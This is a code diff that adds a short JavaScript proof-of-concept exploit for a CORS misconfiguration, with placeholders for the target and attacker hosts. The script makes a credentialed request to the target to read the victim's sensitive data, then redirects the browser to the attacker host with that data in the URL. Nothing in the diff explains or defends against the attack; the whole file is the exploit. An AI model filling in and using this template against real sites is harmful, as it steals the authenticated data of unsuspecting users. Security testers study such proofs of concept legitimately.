@@ -1,0 +1,9 @@
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://<replace-with-vulnerable-host/with-sensitive/data>',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//<replace-with-attacker-host>/log?key='+this.responseText; 
+};
